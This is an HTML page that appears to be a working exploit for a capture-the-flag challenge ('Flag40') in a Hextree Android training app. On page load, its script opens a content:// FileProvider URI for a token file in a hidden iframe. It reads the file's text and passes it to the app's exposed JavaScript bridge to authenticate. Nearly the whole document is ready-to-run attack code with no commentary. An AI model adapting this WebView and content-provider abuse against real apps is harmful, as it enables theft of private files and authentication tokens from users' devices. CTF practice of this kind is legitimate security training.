<!DOCTYPE html>
<html>
<head>
    <title>Flag40 Exploit</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
        h1 { color: #333; }
        #status { font-weight: bold; color: #007700; margin: 10px 0; }
        iframe { display: none; }
    </style>
</head>
<body>
    <h1>Flag40 WebView Exploit</h1>
    <div id="status">Starting...</div>

    <script>
        // The content:// path of the token file
        const tokenURI = "content://io.hextree.root/files/token.txt";

        function attemptAuthWithToken(token) {
            if (window.hextree && window.hextree.authCallback) {
                try {
                    window.hextree.authCallback(token.trim());
                    document.getElementById('status').innerText = "Token sent to authCallback: " + token.substring(0, 10) + "...";
                    console.log("Auth callback executed with token:", token);
                } catch(e) {
                    console.error("Error calling authCallback:", e);
                    document.getElementById('status').innerText = "Error calling authCallback";
                }
            } else {
                console.log("hextree interface not found");
                document.getElementById('status').innerText = "hextree interface not available";
            }
        }

        function loadTokenViaIframe() {
            const iframe = document.createElement("iframe");
            iframe.src = tokenURI;
            iframe.onload = function() {
                try {
                    const doc = iframe.contentDocument || iframe.contentWindow.document;
                    if (doc) {
                        const token = doc.body ? doc.body.innerText || doc.body.textContent : "";
                        if (token) {
                            attemptAuthWithToken(token);
                        } else {
                            document.getElementById('status').innerText = "Token not found in iframe";
                        }
                    }
                } catch (e) {
                    console.error("Iframe error:", e);
                    document.getElementById('status').innerText = "Error reading iframe content";
                }
            };
            iframe.onerror = function(e) {
                console.error("Iframe load failed:", e);
                document.getElementById('status').innerText = "Iframe failed to load token";
            };
            document.body.appendChild(iframe);
        }

        window.onload = function() {
            document.getElementById('status').innerText = "Loading token from FileProvider...";
            loadTokenViaIframe();
        };
    </script>
</body>
</html>
